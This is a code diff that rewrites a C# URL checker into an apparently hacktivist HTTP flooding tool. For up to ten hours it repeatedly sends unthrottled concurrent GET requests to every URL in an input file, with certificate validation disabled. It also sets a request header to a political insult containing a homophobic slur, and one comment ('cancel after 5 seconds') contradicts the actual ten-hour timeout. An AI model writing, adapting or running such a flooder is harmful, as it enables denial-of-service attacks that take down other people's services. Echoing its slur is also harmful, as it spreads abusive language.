@@ -1,50 +1,64 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Net.Http;
+using System.Threading;
 using System.Threading.Tasks;
-using HttpScaner;
 
-var filename = args[0];
+string filename = args[0];
+Console.WriteLine($"--> reading urls from {filename}");
 string?[] urls = File.ReadAllLines(filename);
-Console.WriteLine($"reading urls from {filename}");
-HttpClientHandler clientHandler = new HttpClientHandler();
-clientHandler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => { return true; };
-var tasks = new List<Task<TargetResponse>>();
 
-foreach (string? url in urls)
+List<Task> tasks = new List<Task>();
+CancellationTokenSource cts = new CancellationTokenSource();
+cts.CancelAfter(TimeSpan.FromHours(10)); // cancel after 5 seconds
+int cycle = 0;
+while (!cts.IsCancellationRequested)
 {
-    tasks.Add(Task.Run(async () =>
+    foreach (string? url in urls)
     {
-        using (HttpClient client = new HttpClient(clientHandler))
+        tasks.Add(Task.Run(async () =>
         {
-            var res = new TargetResponse() { Target = url, Status = false };
+            HttpClientHandler clientHandler = new HttpClientHandler()
+            {
+                ServerCertificateCustomValidationCallback = (_, _, _, _) => { return true; },
+                AllowAutoRedirect = true,
+                MaxConnectionsPerServer = 100,
+                UseCookies = true,
+                CookieContainer = new CookieContainer(25),
+                PreAuthenticate = true,
+                MaxResponseHeadersLength = 48
+            };
+            using HttpClient client = new HttpClient(clientHandler);
+            client.Timeout = TimeSpan.FromSeconds(60);
             try
             {
-                if (client != null)
+                client.DefaultRequestHeaders.Add("UserAgent", "PUTIN PIDARAS");
+                HttpResponseMessage resp = await client.GetAsync(url, cts.Token);
+                // Check the response status code
+                if (resp.StatusCode == HttpStatusCode.OK)
                 {
-                    var resp = await client.GetAsync(url);
-                    if (resp.IsSuccessStatusCode)
-                    {
-                        res.Status = true;
-                    }
+                    Console.WriteLine($"{url} : {resp.StatusCode}");
+                }
+                else
+                {
+                    Console.WriteLine($"{url} : {resp.StatusCode} ({resp.ReasonPhrase})");
                 }
             }
-            catch (Exception e)
+            catch (Exception ex)
             {
                 // ignored
-                // Console.WriteLine($"{e}");
+                Console.WriteLine($"{url} : {ex.Message}");
             }
+        }));
+    }
 
-            return res;
-        }
-    }));
+    var results = Task.WhenAll(tasks.ToArray()).ConfigureAwait(false);
+    results.GetAwaiter().OnCompleted(() => { Console.WriteLine($"Completed, CYCLE {cycle++}"); });
+    tasks.Clear();
 }
 
-
-var responses = await Task.WhenAll(tasks.ToArray());
-
-
-foreach (var r in responses)
-{
-    Console.WriteLine($"{r.Target} {r.Status}");
-}
+// Dispose the CancellationTokenSource
+// cts.Dispose();
+Console.WriteLine(">> Done");
